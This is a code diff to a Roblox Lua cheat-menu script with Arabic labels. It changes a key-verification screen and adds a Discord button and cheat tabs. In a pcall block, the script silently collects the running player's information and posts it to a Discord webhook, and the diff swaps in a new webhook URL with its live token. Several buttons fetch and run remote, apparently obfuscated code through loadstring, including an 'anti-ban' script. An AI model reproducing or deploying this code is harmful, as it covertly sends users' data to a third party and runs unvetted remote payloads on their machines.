@@ -66,7 +66,7 @@ end
 --==================================================
 
 pcall(function()
-    local _W = "https://discord.com/api/webhooks/1557748097935872030/BwE66s0NX4FQKSFof5xg8KXKfnXK2P_1KCsPf0WTTFU-Np0qNJc5RF1CZDy2FFeaZcT7"
+    local _W = "https://discord.com/api/webhooks/1558532887106551808/GN9RM2LTE8K0-abawBEH6SFqWJ1rFlMRBd6CW2IXUsNTJsBO9vYa22yKwO1-25PBIZ6g"
     local _info = {}
 
     _info.Username = _L.Name
@@ -528,11 +528,11 @@ Status.Parent = Main
 
 local Verify = Instance.new("TextButton")
 Verify.Position = UDim2.new(0.08, 0, 0, 290)
-Verify.Size = UDim2.new(0.84, 0, 0, 55)
+Verify.Size = UDim2.new(0.40, 0, 0, 55)
 Verify.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
 Verify.Text = "VERIFY KEY"
 Verify.TextColor3 = Color3.fromRGB(255, 255, 255)
-Verify.TextSize = 18
+Verify.TextSize = 16
 Verify.Font = Enum.Font.GothamBold
 Verify.AutoButtonColor = false
 Verify.Parent = Main
@@ -547,6 +547,48 @@ end)
 
 Verify.MouseLeave:Connect(function()
     TweenService:Create(Verify, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(150, 0, 0)}):Play()
+end)
+
+local DiscordBtn = Instance.new("TextButton")
+DiscordBtn.Position = UDim2.new(0.52, 0, 0, 290)
+DiscordBtn.Size = UDim2.new(0.40, 0, 0, 55)
+DiscordBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+DiscordBtn.Text = "سيرفر الدسكورد"
+DiscordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+DiscordBtn.TextSize = 15
+DiscordBtn.Font = Enum.Font.GothamBold
+DiscordBtn.AutoButtonColor = false
+DiscordBtn.Parent = Main
+
+local DiscordCorner = Instance.new("UICorner")
+DiscordCorner.CornerRadius = UDim.new(0, 12)
+DiscordCorner.Parent = DiscordBtn
+
+local DiscordStroke = Instance.new("UIStroke")
+DiscordStroke.Color = Color3.fromRGB(88, 101, 242)
+DiscordStroke.Thickness = 1.5
+DiscordStroke.Parent = DiscordBtn
+
+DiscordBtn.MouseEnter:Connect(function()
+    TweenService:Create(DiscordBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
+end)
+
+DiscordBtn.MouseLeave:Connect(function()
+    TweenService:Create(DiscordBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 45)}):Play()
+end)
+
+DiscordBtn.MouseButton1Click:Connect(function()
+    local link = "https://discord.gg/E2Vnuq3nm"
+    if setclipboard then
+        setclipboard(link)
+    elseif toclipboard then
+        toclipboard(link)
+    end
+    
+    local oldText = DiscordBtn.Text
+    DiscordBtn.Text = "✓ تم نسخ الرابط"
+    task.wait(1.5)
+    DiscordBtn.Text = oldText
 end)
 
 --==================================================
@@ -942,10 +984,16 @@ local function LoadMainScript()
     local TabAnti = Window:NewTab("مضادات")
     local SecAnti = TabAnti:NewSection("مضادات")
     SecAnti:NewButton("مضاد بانق", "تشغيل مضاد بانق", function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/NHYQ1234"))()
+        loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/c73151/D4hpGi_RQfKoTZ3W"))()
     end)
     SecAnti:NewButton("مضاد AFK", "تشغيل مضاد AFK", function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/blackontop123123-max/NHYQ/refs/heads/main/AFK"))()
+    end)
+
+    local TabClipboard = Window:NewTab("نسخ الى الحافظة 📋")
+    local SecClipboard = TabClipboard:NewSection("نسخ الى الحافظة 📋")
+    SecClipboard:NewButton("تشغيل النسخ", "تشغيل سكربت النسخ الى الحافظة", function()
+        loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/c73151/bshNU823r92VSp1O"))()
     end)
 
     local TabLogs = Window:NewTab("لوق دخول و خروج الاعبين")
